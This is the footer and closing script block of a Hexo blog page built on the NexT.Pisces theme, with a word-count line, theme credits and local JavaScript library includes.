      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">141k</span>
  
</div>


  <div class="powered-by">ç”± <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> å¼ºåŠ›é©±åŠ¨</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">ä¸»é¢˜ &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
